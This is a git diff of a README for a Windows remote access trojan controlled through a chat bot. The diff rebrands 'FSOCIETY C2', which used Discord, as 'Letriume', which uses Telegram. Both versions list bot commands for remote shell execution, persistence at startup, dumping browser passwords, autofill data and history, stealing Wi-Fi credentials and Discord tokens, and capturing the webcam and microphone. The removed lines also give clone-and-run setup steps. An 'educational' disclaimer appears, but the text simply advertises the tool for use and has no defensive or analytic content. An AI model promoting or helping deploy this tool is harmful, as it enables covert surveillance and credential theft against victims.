@@ -1,61 +1,42 @@
-# FSOCIETY C2 🔥
+# Letriume - Telegram RAT 🔮
 ![image](https://github.com/user-attachments/assets/3a8d47db-78cf-478d-9b97-8516fe34c86d)
-- **A Discord BOT Remote Access Tool (RAT) for Windows
+- **A Telegram BOT Remote Access Tool (RAT) for Windows
 Educational & Research Purpose Only**
 - **version 1.0 ✅**
-- **V2 soon..**
-
-# V2 sneak-peaks 👀
-![image](https://github.com/user-attachments/assets/17de3f07-42fc-4cff-aa40-2aac5b113b26)
 
 
-# FSOCIETY C2 🔥 - Helps
+# Letriume - Helps 🔮
 ```
-/fsociety sysinfo        - Collect system information
-/fsociety getip          - Get public IP address
-/fsociety shell          - Execute shell commands
-/fsociety startup        - Add program to startup
-/fsociety download       - Download a file from victim
-/fsociety upload         - Upload a file to victim
-/fsociety clipboard      - Get clipboard content
-/fsociety audio          - Convert text to speech
-/fsociety msgbox         - Show a message box
-/fsociety openweb        - Force open a website
-/fsociety process        - List running processes
-/fsociety processkill    - Kill a specific process
-/fsociety disabletaskmgr - Disable Task Manager
-/fsociety enabletaskmgr  - Enable Task Manager
-/fsociety wifi           - Extract saved Wi-Fi credentials
-/fsociety password       - Dump browser saved passwords
-/fsociety autofill       - Dump browser autofill data
-/fsociety history        - Extract browser history
-/fsociety screenshot     - Take a screenshot
-/fsociety webcam         - Capture a webcam image
-/fsociety wallpaper      - Change desktop wallpaper
-/fsociety bluescreen     - Trigger a Blue Screen of Death
+/start        - Start Letrium RAT
+/startup      - Add autostart
+/execute      - Run shell command
+/cd           - Change working directory
+/download     - Download file
+/sysinfo      - Get system info
+/getip        - Get public IP
+/bsod         - Trigger Blue Screen
+/textspech    - Text to speech
+/msgbox       - Popup message box
+/shutdown     - shutdown the PC 
+/restart      - restart the PC
+/process      - List running processes
+/killprocess  - Kill a process by PID
+/screenshot   - Take a screenshot
+/webcam       - Capture webcam image
+/recordmic    - Record microphone
+/password     - Dump browser passwords
+/autofill     - Dump autofill data
+/history      - Dump browser history
+/token        - Dump Discord tokens
 ```
-
-# FSOCIETY C2 🔥 - Video
-https://github.com/user-attachments/assets/e3980eb5-0915-4853-9f76-0bb341a64d30
+![image](https://github.com/user-attachments/assets/be4d1a0b-d0cb-4f8b-848f-73bde3d1909d)
 
 
-# TUTORIAL ❓
-https://github.com/user-attachments/assets/41603348-14c8-4e3a-9d46-aa5049da21c5
 
-![image](https://github.com/user-attachments/assets/931bada8-6877-44fe-9eaf-7f06b6003a2e)
+# Letriume - tutoriual ❓
 
-```
-git clone https://github.com/madanokr001/FSOCIETY-C2.git
-```
-```
-cd FSOCIETY-C2
-```
-```
-ls
-```
-```
-python fsociety.py
-```
+
+https://github.com/user-attachments/assets/45538993-ff02-46cf-9a62-9a1a234bd0b2
 
 
 ## WINDOWS ✅
